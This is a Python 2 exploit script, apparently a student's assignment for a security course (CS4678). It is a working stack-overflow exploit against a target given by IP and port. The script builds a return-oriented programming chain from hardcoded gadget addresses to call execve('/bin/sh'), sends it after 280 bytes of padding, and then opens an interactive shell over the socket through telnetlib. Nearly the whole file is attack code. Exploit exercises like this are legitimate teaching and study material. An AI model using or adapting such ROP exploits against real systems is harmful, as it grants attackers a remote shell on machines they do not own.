#!~/anaconda3/envs/CS4678/bin/python
# Nicholas Villemez
# Assignment 5

import struct
import socket
import sys
import time
import binascii
import os
import math
import md5
import re
import hashlib
import telnetlib
import base64

alphanum = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

def rnd_string(sz):
   res = ''
   for i in xrange(sz):
      res += alphanum[random.randrange(0, len(alphanum))]
   return res

def p(f, *args):
   return struct.pack(f, *args)

def u(f, v):
   return struct.unpack(f, v)

u64 = lambda x: u("<Q", x.ljust(8, '\x00')[:8])[0]

def hx(s):
   return binascii.hexlify(s)
   
def ux(s):
   return binascii.unhexlify(s)

def readUntil(s, content, echo = True):
   x = ""
   while True:
      y = s.recv(1)
      if not y:
         return False
      x += y
      for v in content:
         if x.endswith(v):
            if echo:
               sys.stderr.write(x)
            return x

def ru(s, txt):
   return readUntil(s, [txt])

def interact(s):
   t = telnetlib.Telnet()                                                            
   t.sock = s                                                                        
   t.interact() 

if len(sys.argv) != 3:
   print "usage: python prog.py <ip> <port>"
   sys.exit(0)

tgthost = sys.argv[1]
tgtport = int(sys.argv[2])

target = (tgthost, tgtport)

s = socket.socket()
s.connect(target)


#DO THE FUN STUFF HERE

#----------------execve("/bin/sh", {"/bin/sh", NULL}, NULL) method-------------------

# Variables
binsh = u64('/bin/sh\x00')
null = 0
execve = 59

#binsh address
binsh_addr = 0x6dc3e0

# argv address
argv_addr = binsh_addr - 0x10

# null address 
null_addr = binsh_addr - 0x08

# functions
# function to write to a buffer
write_rcx_rdi = 0x434a3b # 0x0000000000434a3b : mov qword ptr [rdi], rcx ; ret

# pop rcx; ret
poprcx_ret = 0x48a463 #0x000000000048a463 : pop rcx ; ret

# lea rdi, & "/bin/sh"
poprdi_ret = 0x4006c6 # 0x00000000004006c6 : pop rdi ; ret

# lea rsi, & argv
poprsi_ret = 0x403d0e #0x0000000000403d0e: pop rsi; ret;

# mov rdx, 0
poprdx_ret = 0x44c1b5 #0x000000000044c1b5 : pop rdx ; ret

# mov rax, 59
poprax_ret = 0x4005cf #0x00000000004005cf : pop rax ; ret

# syscall
syscall = 0x40149c #0x000000000040149c : syscall

ropchain = [
    poprcx_ret,
    binsh,
    poprdi_ret,
    binsh_addr,
    write_rcx_rdi,

    poprcx_ret,
    binsh_addr,
    poprdi_ret,
    argv_addr,
    write_rcx_rdi,

    poprcx_ret,
    null,
    poprdi_ret,
    null_addr,
    write_rcx_rdi,

    poprsi_ret,
    argv_addr,

    poprdi_ret,
    binsh_addr,
    
    poprdx_ret,
    null,
    
    poprax_ret,
    59,
    syscall
]
#---------------------------------------------------------

rop = struct.pack(("<%dQ" % len(ropchain)), *ropchain)

s.send("A" * 280 + rop + '\n')

# Once you have a shell on some socket s, maybe that's the
# same socket at above, maybe it's a new socket, then interact
# will use telnetlib to handle the asynchronous I/O needed to 
# interact with your shell

interact(s)
